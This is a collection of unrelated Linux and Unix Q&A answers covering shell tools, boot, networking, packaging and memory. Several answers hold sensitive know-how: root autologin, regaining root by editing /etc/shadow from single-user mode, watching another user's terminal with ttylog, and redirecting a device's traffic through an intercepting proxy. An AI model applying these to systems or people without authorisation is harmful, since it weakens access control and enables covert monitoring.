the ratio of cpu time to real time ( computed in one of the many sensible ways ) is the measure of the percent of cpu processing power used by a process out of the total processing power available from the cpu . each process in the system can be in two kinds of state : it is either running on a processor or it is waiting ( reality is a bit more complex than that and there are more process states , but for the sake of simplicity this answer does not differentiate between non-running states , like runnable , interruptible wait , non-interruptible wait etc ) . ordinary process usually spends some time running on a processor and then ends up waiting for an event to happen ( e . g . data arriving on a network connection , disk i/o completing , lock becoming available , cpu becoming available again for a runnable process after it has used up its time quantum ) . the ratio of the time that a process spends running on a processor in a certain time interval to the length of this interval is a very interesting characteristic . processes may differ in this characteristic significantly , e.g. a process running scientific computing program will very likely end up using a lot of cpu and little i/o while your shell mostly waits for i/o and does a bit of processing sporadically . in idealized situation ( no overhead from the scheduler , no interrupts etc ) and with perfect measurement the sum of cpu time used by each process on a system within one second would be less than one second , the remaining time being the idle cpu time . as you add more processes , especially cpu-bound ones the idle cpu time fraction shrinks and the amount of total cpu time used by all processes within each second approaches one second . at that point addition of extra processes may result in runnable processes waiting for cpu and thus increasing run queues lengths ( and hence load averages ) and eventually slowing the system down . note that taking a simple ratio of process 's entire cpu time to the time elapsed since it started ends up representing process 's average cpu usage . since some processes change behavior during runtime ( e . g . database server waiting for queries vs the same database server executing a number of complex queries ) it is often more interesting to know the most recent cpu usage . for this reason some systems ( e . g . freebsd , mac os x ) employ a decaying average as per this manpage : the cpu utilization of the process ; this is a decaying average over up to a minute of previous ( real ) time . since the time base over which this is computed varies ( since processes may be very young ) it is possible for the sum of all %cpu fields to exceed 100% . linux has a simplified accounting which gives you cpu usage as per this manpage : cpu usage is currently expressed as the percentage of time spent running during the entire lifetime of a process . this is not ideal , and it does not conform to the standards that ps otherwise conforms to . cpu usage is unlikely to add up to exactly 100% .
you can do this with a little perl : that should handle everything well . you chould use grep and cut , but then you had have to hope escaping is not required , and that the sections in the ini-format . url file do not matter .
i have always used this : tail -1000 /var/log/apache_access | awk '{print $1}' | sort -nk1 | uniq -c | sort -nk1 with tail i am able to set the limit of how far back i really want to go - good if you do not use log rotate ( for whatever reason ) , second i am making use of awk - since most logs are space delimited i have left my self with the ability to pull additional information out ( possibly what urls they were hitting , statuses , browsers , etc ) by adding the appropriate $ variable . lastly a flaw in uniq it only works in touching pairs - ie : A A A A B A A  will produce : 4 A 1 B 2 A  not the desired output . so we sort the first column ( in this case the ips , but we could sort other columns ) then uniq them , finally sort the count ascending so i can see the highest offenders .
add the following line to "/etc/init/tty . conf": exec /sbin/mingetty --autologin root $TTY 
you need to look at the contents of a file to distinguish between binaries and scripts . ls will not do this , it only looks at file names and metadata ( type , permission , etc . ) . here 's a crude parser for file that colors scripts and binaries differently . it acts like ls -d ; adding metadata would require a patch-up job that calls for a more direct approach ( e . g . in perl or python ) ; use lsx somedir/* to list the contents of a directory . file names are assumed not to contain newlines nor colons ( you can change the : separator for some other string with the -F option to file ) .
for passwordless connections with ssh you need to : use ssh-keygen to generate your public key . use ssh-copy-id to copy the public key to the remote machine .
when the boot loader calls the kernel it passes it a parameter called root . so once the kernel finished initializing it will continue by mounting the given root partition to / and then calling /sbin/init ( unless this has been overriden by other parameters ) . then the init process starts the rest of the system by loading all services that are defined to be started in your default runlevel . depending on your configuration and on the init system that you use , there can be multiple other steps between the ones that i mentioned . currently the most popular init systems on linux are sysvinit ( the traditional one ) , upstart and systemd . you can find more details about the boot process in this wikipedia article . here is a simplified example of my grub config . the important part to answer your question is on the second to last line , there is a root=/dev/sda3: in many configurations the kernel mounts / in read-only mode and all the rest of the options are set to the defaults . in /etc/fstab you might specify file system parameters which would then be applied once init remounts it .
whenever questions of equivolant programs for other platforms come up , the first place i always check is alternativeto . it seems there are several possibilities in your case . interestingly it looks like wolfram alfa has an entry into the field that runs on linux , although the license is proprietary . after that the popular ones appear to be sage , octave and scilab , although you should check through the list to see if anything suits you better as there are some promising names such as freemat and openmodelica ( although if the projects are immature they could be disappointing . )
there is no difference between an application and a script on a filesystem level . arguments are processed within scripts and binaries , and there is nothing special about the file on disk that indicates the arguments it accepts . in order to make it so that your script can be run anywhere , you need to either move it somewhere in the path or add the directory that it is in to your path . to check what your path is : echo $PATH  to append a directory to your path : export PATH=$PATH:/path/to/directory  when installing your script in the appropriate place , do not forget to make it executable : chmod +x /path/to/your/script  as a side note , openwrt will not have bash , being designed for embedded uses . all it has is busybox .
it is often the case that fuse based filesystems only support a subset of the features that the underlying filesystems support . it is generally some aspect of one or more of these features which is limiting the incrontab entry from detecting the change on the remote side . at any rate i thought it best to inquire about this on the s3fs project , and so posted this question there asking the developers for guidance on any potential limitations . you can track this issue/question here : issue 385: incrontab and s3fs support ? references incrontab man page fuse-based file system backed by amazon s3
just type in terminal ' iw ' and then press tab and you will see something like iw iw iwconfig iwevent iwgetid iwlist iwpriv iwspy all those are related to wireless internet , try iwconfig to show statistic about signal and network interface .
on the server , in .profile or whatever is run when you log in : if [ -n "$USE_DIR_A" ]; then cd dir_a elif [ -n "$USE_DIR_B" ]; then cd dir_b fi  then , on the local machine , set both variables : export USE_DIR_A=yes export USE_DIR_B=yes  and , set your .ssh/config like this : of course , you could just have one ssh config that sends one variable , and set that variable to the directory you want for each machine , but that is not what you asked for . beware ssh connection sharing though : it can affect which scripts are run on start-up in subsequent connections .
you can type : <code> $ cat very-long-filename . ext1 ctrl+w ctrl+y > ctrl+y backspace 2 </code> or : <code> $ cat very-long-filename . ctrl+w ctrl+y ext1 > ctrl+y ext2 </code> to really use brace expansion , note that : cat a.ext1 &gt; a.ext2  can also be written : cat &gt; a.ext2 a.ext1  however you cannot do : <code> cat > a . ext{2,1} </code> however , you could do : eval cat \&gt; a.ext{2,1} 
it is an expected behavior , and already discussed several times . the script is run in a subshell , and cannot change the parent shell working directory . its effects are lost when it finishes . to change directory permanently you should source the script , as in . ./script 
two options ( within selinux ) exist : 1 ) all else fails audit2allow can convert any selinux denials into allowed operation . 2 ) what i would recommend : enable the selinux boolean for allowing httpd_t to access nfs_t objects : security contexts are set by the machine that mounts the remote filesystem , so solaris is largely unrelated . even if the exports were coming from rhel the nfs exports are still going to be nfs_t and there is not much you can do about that
try this : setxkbmap -option keypad:pointerkeys  and then the combination .
see this previous question , titled : recurrent loss of wireless connectivity . the n-1000 cards have continuously suffered from this issue . generally there has been 3 options to get around it : disable wireless-n on your wifi access point disable wireless-n in the wifi client upgraded the firmware or drivers to resolve the issue
you either provide a wrapper script or a function doing what you need , e . g : background() { "$@" &amp; }  and use the function/script instead : alias -s {mkv,mpg}='background mplayer' 
for developing c/c++ you need the gcc compiler , which is included in most linux distributions or can be easily installed . there is not a default ide : most people use their favorite editor ( vim , emacs , geany etc . . . ) and there are ides like eclipse or kdevelop available . c# can be done with mono , but it is not fully compatible with .net: check the compatibility list .
use find which is better suited for your intended purpose : find . -name "mkmf*"  it will list all appearances of your pattern including the relative path . for more information look at manual page of find with man find or go to http://www.gnu.org/software/findutils/manual/html_mono/find.html
that is cinnamon 's view of the screensaver . gnome has it is own view in gnome-control-center that controls the settings you want . oddly ( in mint maya at least ) both show up in the menu under system tools as " system settings " making it extra confusing . i ended up renaming one " gnome settings "
you can prefix most sed commands with an address to limit the lines to which they apply . an address can be a line number , or a regex delimited by / . cat INPUT | sed '/Select ASDF/ s=sdfg=XXXX='  as mentioned peter . o , the command as written above will substitute the first occurrence of any sdfg in the string containing Select ASDF . if you need to substitute the exact match to sdfg only in the case it is in fourth column you should go this way : cat INPUT | sed 's/\(^Select ASDF [^ ]* \)sdfg /\1XXXX /' 
assuming you have root on the system , you can use a bind mount . note that this will leave you with an empty camera uploads directory in your ~/dropbox/pictures , but avoiding that adds much more complexity ( unionfs of some sort ) . you can put these bind mounts in /etc/fstab or run them through sudo , of course .
try : wget -r -np -k -p http://www.site.com/dir/page.html  the args ( see man wget ) are : r recurse into links , retrieving those pages too ( this has a default max depth of 5 , can be set with -l ) . np never enter a parent directory ( i.e. . , do not follow a " home " link and mirror the whole site ; this will prevent going above ccc in your example ) . k convert links relative to local copy . p get page-requisites like stylesheets ( this is an exception to the np rule ) . if i remember correctly , wget will create a directory named after the domain and put everything in there , but just in case try it from an empty pwd .
check the gnu sed manual ( http://www.gnu.org/software/sed/manual/html_node/other-commands.html#other-commands ) -- the i command is actually the i\ command , so you just need an extra backslash echo match | sed -e '/match/i\\tline1\\n\tline2' # ---------------------------^ 
use type commandname . this returns true if commandname is anything executable : alias , function , built-in or external command ( looked up in $PATH ) . alternatively , use command commandname which returns true if commandname is a built-in or external command ( looked up in $PATH ) . exists () { type "$1" &gt;/dev/null 2&gt;/dev/null }  there are a few sh variants ( definitely pre-posix ; i know of /bin/sh under osf1 ≤3 . x and some versions of the almquist shell found in early netbsd versions and a few 20th-century linux distributions ) where type always returns 0 or does not exist . i do not think any systems shipped with these this millennium . if you ever encounter them , here 's a function you can use to search in $PATH manually : exists () { ( IFS=: for d in $PATH; do if test -x "$d/$1"; then return 0; fi done return 1 ) }  this function is generally useful if you want to exclude built-ins and functions and look up the name in $PATH . most shells have a built-in for this , command -v , though it is a relatively recent addition to posix ( still optional as of posix:2004 ) . it is basically a programmer-friendly version of type: it prints the full path for an executable in $PATH , the bare name for a built-in or function , and an alias definition for an alias . ksh , bash and zsh also have type -p to look up only executables in $PATH . note that in bash , the return status of type -p foo is 0 if foo is a built-in or function ; if you want to test for an executable in $PATH , you need to check that the output is not empty . type -p is not in posix ; for instance debian 's ash ( which is /bin/sh on ubuntu ) does not have it .
linux will not opportunistically move data from swap back into ram before it actually needs to ; otherwise , things would go much slower , as any freed page of ram would result in it having to read a page of swap as well ( until swap was empty ) . if you want to force it to move everything left in swap back into ram , you can temporarily disable swap with the swapoff command ( do not forget to turn it back on with swapon afterwards ! ) . bear in mind that while this is running , the system will be nearly unusable as it drags everything back into memory . you are probably better off just leaving it alone and letting it move things back into memory when and as needed .
you can try something like grep PATTERN FILE | nl  or grep PATTERN FILE | wc -l  the first one will number the filtered lines . the second one will count them all .
no need for the 2 phases to find out the lines beforehand . just do the whole thing with sed: sed '/Page # 2/,/Page # 3/!d' &lt; FileName.txt 
if you have an account with sudo permission , you can run : sudo passwd root  to unlock root password . if you do not have sudo permission , you should boot into single user mode ( by editing boot option if you use grub ) or using a live cd , then editing /etc/shadow file ( not /etc/passwd ) to remove pair of exclamation mark !! or ! before hash password , example : root:!!&lt;hash password here&gt;:9797:0:::::  after that , reboot and now you can log in with root again .
i think this is limitation or bug in current rpm/rpmbuild versions . i reported this issue so i think in a way question is answered : https://bugzilla.novell.com/show_bug.cgi?id=697943
what you are looking for can be found on the ohloh website , which by the way indexes the linux git repository . there you will see a graph showing you how much the kernel has changed over 1 yr , 3 yrs , 5 yrs , 10 yrs or all . by default it will show you the statistics for the source code but you can also get statistics about languages , committers , commits . you can then manually calculate the change % . the change in source code between 2010 and 2011 is up 11.4% .
before running anything , use the puppet cert tool to generate certificate names with a specified list of alternate dns names : puppet cert generate --dns_alt_names \ kungfumaster,kungfumaster.mynetwork.com kungfumaster  if you have already generated one , clean it out : puppet cert clean -a  i still need to figure out how it knows my zone info , but that is another question .
ls Essays/  works from within Documents . a tiny snippet of freebsd 's ls man page :  ls [ .... ] [file ...]  DESCRIPTION for each operand that names a file of a type other than directory , ls displays its name as well as any requested , associated information . for each operand that names a file of type directory , ls displays the names of files contained within that directory , as well as any requested , associated information .
i have debian stable , not sid , but it looks the same as what you describe so i think this answer is good for both . the post-update.d directory does not exist in a default installation , but it is still checked by the update-initramfs script . the script does not distinguish between " nonexistent directory " and " exists but is empty " . the intention is that if you are installing a bootloader that needs this functionality , you can just go ahead and create the directory yourself . the lilo and elilo packages do this , for example . install one or both of those packages and you will have an example to look at .
is it possible ? yes . is it a good idea ? that depends . you would only really need to do this if the application only exists as a .deb package . it is much more likely that you can just grab the upstream source and write a simple pkgbuild to install it with pacman . you should also search the aur to ensure that someone has not done this already .
i think the best way to make use of your cores in gpu is to use opencl . the idea is quite simple . you write a kernel ( a small block of code , where you can use only basic c code without libraries ) . for example , if you want to filter a frame , you have to do some calculations on each pixel and that is what the kernel code will do . then you have to compile the kernel , allocate the memory on gpu and copy data from the main memory there . you also have to allocate memory for the result . then you create threads and send the kernel into execution on gpu ( i think you can also use both cpu and gpu cores at once to execute kernels ) . so each thread executes the kernel once for every pixel . after you copy the result back to main memory and continue working with the cpu . this is the simplest way i can explain this , but there is still a million details you have to know , so you better start learning ; ) you can start with your graphics card manufacturer developer web site . there you will find the libraries and tutorials on how to start developing in opencl .
pkg_info answers questions like this . with the -R option it expects a name of an installed port and will display all ports that depend on that port : pkg_info -R libXfont-1.4.3,1  you can use wildcards to avoid specifying the name with the version number : pkg_info -R libXfont-\*  note that this does not work recursively , and thus you need to do pkg_info -R again for each port in the resulting list until you get to the bottom of things . note that on servers it is often a good idea to put the following in /etc/make.conf: WITHOUT_X11=yes  that will make most ( all ? ) ports to skip dependencies to any x11 related stuff .
sed '/^[[:alpha:]]/{$!N;s/\\n/ /;}' &lt;&lt;\DATA NAME_A 12,1 NAME_B 21,2 DATA  output NAME_A 12,1 NAME_B 21,2  that addresses lines beginning with a letter , pulls in the next if there is one , and substitutes a tab character for the newline . note that the s/\\n/&lt;tab&gt;/ bit contains a literal tab character here , though some seds might also support the \t escape in its place to handle a recursive situation you need to make it a little more robust , like this : sed '$!N;/^[[:alpha:]].*\\n[^[:alpha:]]/s/\\n/ /;P;D' &lt;&lt;\DATA NAME_A NAME_B 12,1 NAME_C 21,2 DATA  output NAME_A NAME_B 12,1 NAME_C 21,2  that slides through a data set always one line ahead . if two ^[[:alpha:]] lines occur one after the other , it does not mistakenly replace the newline , as you can see .
you can override normal-mode commands ( like [N]G ) with :nnoremap , but there is no hook for ex commands ( like the peculiar :[N] ) . your only options are a hook on the CursorMoved event : :autocmd CursorMoved * normal! zz  but that would affect all jumps , or a custom command , e.g. :[N]J , but that is even more typing . best re-teach yourself to use G ( it is shorter , too ! ) and use this mapping : :nnoremap &lt;expr&gt; G (v:count ? 'Gzz' : 'G') 
you have to install unoconv and pdftk . ubuntu : sudo apt-get install unoconv pdftk
it seems likely that your script is writing most or all of it is output to stderr . this is easy to test myscript.sh &gt; std.out myscript.sh 2&gt; err.out  then look at the contents of each file and be educated . i doubt it - the only output from the script comes from calls to wget instead of doubting , again this is easy to test see , output still gets written to the terminal then try  $ wget http://serverfault.com 2&gt;err.out $  q.e.d. the wget command writes it is output to stderr not stdout .
according to this thread titled : imap dovecot error - corrupted index cache 10.6.4 it sounds like you just need to do the following : scribit re : imap dovecot error - corrupted index cache 10.6.4 nov 30 , 2010 11:10 am ( in response to scribit ) i am not sure if this is the best procedure and there may be unintended consequences , but this is what i did to resolve the issue . i stopped the mail service . from a shell , i navigated to each directory where an issue was reported . in these directories , i renamed the following files , prepending them with " old . "  dovecot.index dovecot.index.cache dovecot.index.log  example : mv dovecot.index old.dovecot.index i then restarted the mail service . these 3 files were recreated for each imap folder on client access .
route is the old traditional tool and available on numerous unix systems . ip belongs to the iproute2 suite which is a linux only tool and uses the netlink api , which is a socket like interface for accessing kernel information about interfaces , address assignments and routes . it replaces most of the functionality of ifconfig , route , netstat and a few others . i assume you are on linux , then you should use ip since route and ifconfig are deprecated , although still widely used . further reading : ifconfig vs iproute2 iproute2: life after ifconfig deprecated linux networking commands and their replacements
i opted to solve this issue by starting from scratch . i installed fedora 17 , hostapd , dnsmasq , iptables , and community drivers . the drivers i used were compatible with my hardware and the instructions for installing them are here : http://linuxwireless.org/en/users/drivers/b43 . dnsmasq was used to host a dhcp server which will assign ips to connected devices . iptables was used to enable nat forwarding through my ethernet interface . hostapd was used to manage the wifi connection and security . the following is a script i made to start a working access point : the content of hostapd.conf is the following :
these are known as parameter expansion , which is advance syntax of shell scripting ${2:-/var/run/$base.pid} is example of ${VAR :-default }  this will result in $VAR unless VAR is unset or null , in which case it will result in default . in given script , if ${2} is not set , then default value /var/run/$base.pid is taken base=${1##*/} is example of ${var#Pattern} you can strip $var as per given pattern from front of $var if f=/etc/resolv.conf then , echo ${f#/etc/} will remove /etc/ part and get a filename only update : f=/etc/httpd/httpd.conf # This will return etc/httpd/httpd.conf echo ${f#*/} # This will return httpd.conf echo ${f##*/}  single # is non-greedy whereas , double # is greedy approach of matching expression .
i believe the bit you are referring to is covered here on the free software foundation ( fsf ) website : http://www.gnu.org/gnu/linux-and-gnu.html according to the fsf their contention is that linux is just a kernel . a usable system is comprised of a kernel + the tools such as ls , find , shells , etc . therefore when referring to the entire system , it should be referred to as gnu/linux , since the other tools together with the linux kernel make up a complete usable system . they even go on to talk about the fsf unix kernel , hurd , making arguments that hurd and linux are essentially interchangeable kernels to the gnu/x system . i find the entire argument tiring and think there are better things to do with our time . a name is just a name and the fact that people consider a system that includes gnu software + the linux kernel + other non-gnu software to be linux or gnu/linux a matter of taste and really does not matter in the grand scheme of things . in fact i think the argument does more to hurt linux and gnu/linux by fracturing the community and confusing the general public as to what each thing actually is . for more than you ever wanted to know on this topic take a look at the wikipedia articled titled : gnu/linux naming controversy . all unixes opensource ? to my knowledge not all unixes are opensource . most of the functionality within unix is specified so that how things work is open , but specific implementations of this functionality is or is not open depending on which distro it is a part of . for example , until recently solaris , a unix , was not considered open source . only when sun microsystem 's released core components into the opensolaris project , did it at least components of solaris become open source . unix history i am by no means an expert on this topic , so i would suggest taking a look at the unix wikipedia page for more on the topic . linux history take a look at the unix lineage diagram for more on which unixes are considered open , mixed , or closed source . http://upload.wikimedia.org/wikipedia/commons/7/77/unix_history-simple.svg &nbsp ; &nbsp ; i also find the gnu/linux distribution timeline project useful when having this conversation . http://futurist.se/gldt/wp-content/uploads/12.10/gldt1210.png
if this is a reimplementation of the same game ( it sounds like it based on the prompts ) , it is an implementation of mastermind . try giving it a 4-digit number . it should output a number of " bulls " and " cows " , for the number of right digits in the right and wrong places , respectively . for example , if the secret is 1234 , the guess 0243 should give you one bull and two cows , while the guess 1235 should give you three bulls and zero cows
does this work for you ? w -hs|awk '{printf "%s\t%s\\n",$1,$3}' 
give tuxfamily a look . about tuxfamily . org tuxfamily is a non-profit organization . it provides free services for projects and contents dealing with the free software philosophy ( free as in free speech , not as in free beer ) . we accept any project released under a free license ( gpl , bsd , cc-by-sa , art libre . . . ) . born in 1999 ( oh ! already ? ) , tuxfamily tries to provide a good and reliable service to promote free projects , making them visible to the users . the hosting is free and we do not add banners or pop-ups to the hosted websites . you do not even have to advertise for tuxfamily ! you can also use your own domain name if you have one . tuxfamily hosting facilities are running on vhffs , which is a subproject of tuxfamily that makes it possible to manage a massive virtual hosting platform . services for hosted people these are the services you can get with tuxfamily . only one requirement : be a free ( as in free speech ) project . web hosting ( php5 is supported ) mysql and postgresql databases cvs repositories subversion repositories git repositories mailing-lists manage domain names ( dns hosting ) - registration fees are still at your charge pop accounts and mail redirects for your domain download area of 1 gb , can be increased if you need more space 100 mb quota for all groups , not including the download area , can be increased if you need more space handling of your data through ftp , ftps ( ftp over ssl ) , ssh and sftp also found this lxer article : best free or low cost places to host a linux distro repository .
i came across this one tool called ttylog . it is a perl program available on cpan here . it has a couple caveats , one being that i could only figure out how to attach to a terminal that was created as part of someone ssh'ing into my box . the other being that you have to run it with elevated privileges ( i.e. . root or sudo ) . but it works ! for example first ssh into your box in term#1: TERM#1% ssh saml@grinchy  note this new terminal 's tty : TERM#1% tty /dev/pts/3  now in another terminal ( term#2 ) run this command : now go back to term#1 and type stuff , it'll show up in term#2 . all the commands i tried , ( top , ls , etc . ) worked without incident using ttylog .
you can configure a default target via the .stowrc file ; please see this section of the manual . if there is a compelling reason for needing to also set the default target directory via an environment variable , i can implement that for the next release too .
i assume that you are wondering about amd64 vs i386 , the 64-bit and 32-bit architectures on pcs ( there is also a choice of word size on sparc64 ) . according to the official platform description : the only major shortcoming at this time is that the kernel debugger ddb is somewhat poor . another mentioned limitation is that if your processor lacks the nx bit ( most amd64 processors have it ) , on a 64-bit system , you will not get openbsd 's protection against some exploits based on uploading executable code as data and exploiting a bug ( e . g . a buffer overflow ) to execute that code . another resource to check is the faq . most importantly , unlike on many other operating systems , you can not run 32-bit binaries on openbsd/amd64 . there are several virtualization technologies that allow running openbsd/amd64 and openbsd/i386 on the same machine ( xen , vmware , and virtualbox should support openbsd/amd64 guests with a 64-bit hypervisor or host os ; i do not know if there is a way to virtualize openbsd/i386 on an openbsd/amd64 host ) .
/var/log/messages  that is the main log file you should check for messages related to this . additionally either /var/log/syslog ( ubuntu ) or /var/log/secure ( centos ) to find out when your server was last rebooted just type uptime to see how long it has been up .
you do not want to intercept this in the air . it is very hard to do well . i suggest you change your network around a bit . you will need a pc with two network interfaces and two routers to pull this off . here 's how i would do it : Internet --&gt; Router --&gt; Ubuntu machine --(network port)--&gt; Wifi router --&gt; iPod  ubuntu needs to " share " the internet connection with the second router . this is actually dead simple with network manager : just create a new connection and in the ipv4 tab , set " method " to " shared to other computers " . the second router should then get traffic from your pc and you should connect your ipod to the second router . now you just need to intercept and mangle the traffic . let 's deal the the mangle first . you want something like hatkit . it is simple and for purpose . it will not handle tons of traffic but it'll get you going . set it to run on 127.0.0.1:8080 ( the default ) . there are other similar proxies out there including scripts you can hack into and customise . and to intercept , you just need a simple iptables rule to redirect incoming traffic from the second router through your proxy ( you need to replace the ip 10.42.43.2 with the one that ubuntu has assigned your second router - most easily found out by looking at the admin pages on the second router ) : sudo iptables -t nat -A PREROUTING -p tcp -s 10.42.43.2 \ --destination-port 80 -j REDIRECT --to-ports 8080  now when you request things on port 80 from the second router , all the requests should fly through hatkit where you can alter them and the responses to your delight . enjoy hacking your game :p you can do this with a laptop : network cable in from the first router and use the onboard wireless as an access point . i did not suggest this because ad-hoc networking in my experience is extremely flaky in ubuntu . i have two nics and more routers than i can shake a stick at , so the other way is just easier for me .
the message “zsh : sure you want to delete all the files” is a zsh feature , specifically triggered by invoking a command called rm with an argument that is * before glob expansion . you can turn this off with setopt no_rm_star_silent . the message “rm : remove regular file” comes from the rm command itself . it will not show up by default , it only appears when rm is invoked with the option -i . if you do not want this message , do not pass that option . even without -i , rm prompts for confirmation ( with a different message ) if you try to delete a read-only file ; you can remove this confirmation by passing the option -f . since you did not pass -i on the command line , rm is presumably an alias for rm -i ( it could also be a function , a non-standard wrapper command , or a different alias , but the alias rm -i is by far the most plausible ) . some default configurations include alias rm='rm -i' in their shell initialization files ; this could be something that your distribution or your system administrator set up , or something that you picked up from somewhere and added to your configuration file then forgot . check your ~/.zshrc for an alias definition for rm . if you find one , remove it . if you do not find one , add a command to remove the alias : unalias rm 
from the faq in the source ( i can not find any documentation online ) : why does not history substitution ( " ! $" etc . ) work ? because history substitution is an awkward interface that was invented before interactive line editing was even possible . fish drops it in favor of perfecting the interactive history recall interface . switching requires a small change of habits : if you want to modify an old line/word , first recall it , then edit . e.g. do not type " sudo ! ! " - first press up , then home , then type " sudo " .
no gui , old machine ? netbsd would be my choice ( though the installation is a pain if you are not used to setting everything up yourself ) . on second thought , freebsd 9.0 is much easier to set up and support will be easier to find . it does not use too much memory and your arch is probably supported .
you should be able to choose the language at the login screen . if not , open a terminal ( you can use alt + f2 to get the run dialog ) and run ( source ) : echo -e 'LANG="en_US"\\nLANGUAGE="en_US:en"' | sudo tee /etc/default/locale echo -e 'LANG=en_US\\nLanguage=en_US' &gt; ~/.pam_environment  then log out and log back in again . edit ( in response to the op 's comment ) the commands above are just a quick way of editing a couple of text files . if they do not work for whatever reason , you can just edit the files manually using a text editor ( i believe the default on kde is write ) . so , open a terminal and run : sudo kwrite /etc/default/locale`  edit the file to contain only these lines : LANG="en_US" LANGUAGE="en_US:en"  now open ~/.pam_environment: sudo kwrite ~/.pam_environment  edit the file to contain only these lines : LANG=en_US Language=en_US  take care : if you write and save the incorrect values to your locale , you might have troubles on booting .
instead of specifying numbers , you can do unset HISTSIZE unset HISTFILESIZE shopt -s histappend  in which case only your disk size ( and your " largest file limit " , if your os or fs has one ) is the limit . however , be aware that this will eventually slow down bash more and more . see here and here for better ways .
a lot of linux routing and networking capabilities can be found in the linux advanced routing and traffic control howto . in particular , your specific question is addressed in 4.2 routing for multiple uplinks/providers .
you should not use read , select or dialog yourself but use debconf instead which supports readline , dialog , gtk and even web frontends . this is much more flexible than your own system . if you are using dh for building your system it will automatically use dh_installdebconf and you will just have to place your template in debian/package.config and do not have to adjust/modify your debian/rules file or postinst script . for a short introduction into debconf have a look at the debconf programmer 's tutorial .
^ at the beginning of an expression means " beginning of line " . however , ^ inside a bracket expression matches everything not in that expression . so , for example , while [abcd] matches the letters a , b , c , or d , the expression [^abcd] matches everything other than those letters . so the expression you have got matches " anything not a-m , followed by 1 or more digits " . the following lines would all match that expression : mmmmmz09123 00 this is a very long line that includes the number 1.  because they all contain a digit preceded by something that is not in the range a-m .
this is a limitation of bash . quoting the manual : the rules concerning the definition and use of aliases are somewhat confusing . bash expands aliases when it reads a command . a command , in this sense , consists of complete commands ( the whole if \u2026 fi block is one compound command ) and complete lines ( so if you wrote \u2026 fi; WeirdTest rather than put a newline after fi , the second occurrence of WierdTest would not be expanded either ) . in your script , when the if command is being read , the WeirdTest alias does not exist yet . a possible workaround is to define a function : if \u2026; then WeirdTest () { uptime; } WeirdTest fi WeirdTest  if you wanted to use an alias so that it could call an external command by the same name , you can do that with a function by adding command before it . WeirdTest () { command WeirdTest --extra-option "$@"; } 
page cache , sometimes referred to as disk cache , is a transparent ram buffer for access to and from on-disk files . in general any memory not allocated to running applications is used for page cache space . /proc/meminfo contains information about , among other things , page cache . executing cat /proc/meminfo | grep -iE "^(cached|dirty)" will display the size of the page cache and the volume of data marked " dirty " , meaning file data that has been marked for writing to disk . dentry cache serves to improve performance access to the file system by storing entries representing the directory levels which comprise the representation of a path . also contained in the dentry cache is an inode representing the object . dentry cache resides opposite , or along side depending on perspective , the inode cache . the inode cache is comprised of two lists containing used and unused inodes respectively as well as a hash table of inodes in use . every entry in the dentry cache contains an entry in the inode cache .
one of the standard ways of doing this is to download the php source code from http://php.net/downloads.php and compile it with ./configure --prefix=/opt/php/5.3.15 or something to that effect . then , your new php will not conflict with any system packages . note that on fedora , you will need to install a bunch of -devel packages to build php with the functionality you most likely want .
i think /opt is more standard in this sort of context . see the relevant section in the filesystem hierarchy standard .
what is $TERM for ? the $TERM variable is for use by applications to take advantage of capabilities of that terminal . for example , if a program want 's to display colored text , it must first find out if the terminal you are using supports colored text , and then if it does , how to do colored text . the way this works is that the system keeps a library of known terminals and their capabilities . on most systems this is in /usr/share/terminfo ( there is also termcap , but it is legacy not used much any more ) . so lets say you have a program that wants to display red text . it basically makes a call to the terminfo library that says " give me the sequence of bytes i have to send for red text for the xterm terminal " . then it just takes those bytes and prints them out . you can try this yourself by doing tput setf 4; echo hi . this will get the setf terminfo capability and pass it a parameter of 4 , which is the color you want . why gnome terminal lies about itself : now lets say you have some shiny new terminal emulator that was just released , and the system 's terminfo library does not have a definition for it yet . when your application goes to look up how to do something , it will fail because the terminal is not known . the way your terminal gets around this is by lying about who it is . so your gnome terminal is saying " i am xterm " . xterm is a very basic terminal that has been around since the dawn of x11 , and thus most terminal emulators support what it supports . so by gnome terminal saying it is an xterm , it is more likely to have a definition in the terminfo library . the downside to lying about your terminal type is that the terminal might actually support a lot more than xterm does ( for example , many new terminals support 256 colors , while older terminals only supported 16 ) . so you have a tradeoff , get more features , or have more compatibility . most terminals will opt for more compatibility , and thus choose to advertise themselves as xterm . if you want to override this , many terminals will offer some way of configuring the behavior . but you can also just do export TERM=gnome-terminal .
how about making a new user , and then copying all the hidden files to this new user . you could then rename the new user to your old one . i do not know the specifics of your situation , but i think this is better than manually recreating the default folders .
the $ ? variable holds the return value of the last command . you could do this : echo "root:passwd" | chpasswd RET=$?  or test directly , e.g. echo "root:passwd" | chpasswd if [ "$?" -ne 0 ]; then echo "Failed" fi 
let 's consider how each solution works . uniq this requires that the file already be sorted . if not , you have to pipe it through sort first , which means that sort has to read the entire file into memory , reorder it ( O(n log n) ) , and then write it into the pipe . the work of uniq is very cheap , since it only has to compare adjacent lines of its input . sort -u this combines the work of sort | uniq . this has to collect all the unique inputs into memory like the awk script does , but it also then wastes time sorting them before producing the output . this is O(n log n) , although in this case n is the number of unique items , not all the inputs . so it is better than the pipe . sed i am not sure why you listed this , as i can not think of a good way to do this with sed at all . maybe if you first sort it and pipe to a sed script , there is a way to compare adjacent lines . so sed would just be doing what uniq does , and uniq probably does it about as efficiently as possible . awk this is likely the best because it only does the minimal amount of work necessary . as it reads each line , it does an efficient hash lookup to see if the line is already in its memory , and only stores the unique lines . when it is done reading the input , it just dumps the hash table in its internal order , without needing to sort it . this uses O(n) time and O(uniq n) memory . every method will use a considerable amount of memory , either for sorting the input or keeping track of which inputs have seen so they can remove duplicates .
if you want to do this upgrade , i would upgrade to slackware-13.37 first , using the hints in upgrade . txt , and then upgrade 13.37 to -current once that is complete . during each release cycle , several packages are added and removed , so to move from 13.37 to current in the second step , you should read the changelog closely to see what steps you might need to take to run current . there will likely be slackbuilds which do not work in the latest -current , especially since there has been an upgrade to a new gcc which breaks certain build scripts . additionally , the usual warning that slackbuilds . org does not support -current still applied . that being said , many people run current and use slackbuilds without much problem . for programs that you have compiled yourself , the same caveats apply . if you follow upgrade . txt and changelog notes you should have a -current system running fairly easily . it is hard to say if you will have problems with your other applications without knowing what they are , but i should not think it will be a major issue .
